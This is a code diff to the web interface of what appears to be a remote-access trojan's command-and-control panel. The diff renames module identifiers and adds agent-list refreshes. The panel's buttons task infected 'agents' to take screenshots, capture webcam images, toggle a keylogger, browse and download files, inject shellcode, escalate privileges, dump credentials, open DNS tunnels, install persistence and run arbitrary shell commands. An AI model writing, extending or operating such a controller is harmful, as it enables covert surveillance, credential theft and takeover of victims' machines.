@@ -156,70 +156,70 @@
             <div class="module-card">
                 <h3>System Information</h3>
                 <p>Get detailed system information from the target.</p>
-                <button onclick="sendTask('modules.system.get_info')">Get System Info</button>
+                <button onclick="sendTask('system.get_info')">Get System Info</button>
             </div>
 
             <div class="module-card">
                 <h3>Process Management</h3>
                 <p>List and manage processes on the target system.</p>
-                <button onclick="sendTask('modules.process.list')">List Processes</button>
+                <button onclick="sendTask('process.list')">List Processes</button>
             </div>
 
             <!-- Surveillance Modules -->
             <div class="module-card">
                 <h3>Screenshot</h3>
                 <p>Capture screen of the target system.</p>
-                <button onclick="sendTask('modules.surveillance.screenshot')">Take Screenshot</button>
+                <button onclick="sendTask('surveillance.screenshot')">Take Screenshot</button>
             </div>
 
             <div class="module-card">
                 <h3>Webcam</h3>
                 <p>Capture image from webcam if available.</p>
-                <button onclick="sendTask('modules.surveillance.webcam')">Capture Webcam</button>
+                <button onclick="sendTask('surveillance.webcam')">Capture Webcam</button>
             </div>
 
             <div class="module-card">
                 <h3>Keylogger</h3>
                 <p>Start/Stop keylogging on the target.</p>
-                <button onclick="sendTask('modules.surveillance.keylogger')">Toggle Keylogger</button>
+                <button onclick="sendTask('surveillance.keylogger')">Toggle Keylogger</button>
             </div>
 
             <!-- File Operations -->
             <div class="module-card">
                 <h3>File Browser</h3>
                 <p>Browse and download files from the target.</p>
-                <button onclick="sendTask('modules.files.browser')">Browse Files</button>
+                <button onclick="sendTask('files.browser')">Browse Files</button>
             </div>
 
             <!-- Advanced Modules -->
             <div class="module-card">
                 <h3>Shellcode Injection</h3>
                 <p>Inject shellcode into target process.</p>
-                <button onclick="sendTask('modules.shellcode.inject')">Inject Shellcode</button>
+                <button onclick="sendTask('shellcode.inject')">Inject Shellcode</button>
             </div>
 
             <div class="module-card">
                 <h3>Privilege Escalation</h3>
                 <p>Attempt to elevate privileges.</p>
-                <button onclick="sendTask('modules.privesc.auto')">Escalate Privileges</button>
+                <button onclick="sendTask('privesc.auto')">Escalate Privileges</button>
             </div>
 
             <div class="module-card">
                 <h3>Credential Access</h3>
                 <p>Attempt to dump stored credentials.</p>
-                <button onclick="sendTask('modules.credentials.dump')">Dump Credentials</button>
+                <button onclick="sendTask('credentials.dump')">Dump Credentials</button>
             </div>
 
             <div class="module-card">
                 <h3>DNS Tunneling</h3>
                 <p>Establish DNS tunneling channel.</p>
-                <button onclick="sendTask('modules.dns_tunnel.start')">Toggle DNS Tunnel</button>
+                <button onclick="sendTask('dns_tunnel.start')">Toggle DNS Tunnel</button>
             </div>
 
             <div class="module-card">
                 <h3>Persistence</h3>
                 <p>Install persistence mechanism.</p>
-                <button onclick="sendTask('modules.persistence.install')">Install Persistence</button>
+                <button onclick="sendTask('persistence.install')">Install Persistence</button>
             </div>
 
             <div class="module-card">
@@ -289,7 +289,9 @@
 
                 const result = await response.json();
                 if (result.status === 'success') {
-                    showStatus(`Task ${taskType} sent successfully. Task ID: ${result.task_id}`, 'success');
+                    showStatus(`Task sent successfully. Task ID: ${result.task_id}`, 'success');
+                    // Refresh the agent list to show updated status
+                    setTimeout(updateAgentList, 1000);
                 } else {
                     showStatus(`Error: ${result.message}`, 'error');
                 }
@@ -315,7 +317,7 @@
                         },
                         body: JSON.stringify({
                             agent_id: agentId,
-                            module: 'modules.shell.execute',
+                            module: 'shell.execute',
                             params: {
                                 command: command
                             }
@@ -324,7 +326,9 @@
 
                     const result = await response.json();
                     if (result.status === 'success') {
-                        showStatus(`Custom command sent successfully. Task ID: ${result.task_id}`, 'success');
+                        showStatus(`Command sent successfully. Task ID: ${result.task_id}`, 'success');
+                        // Refresh the agent list to show updated status
+                        setTimeout(updateAgentList, 1000);
                     } else {
                         showStatus(`Error: ${result.message}`, 'error');
                     }
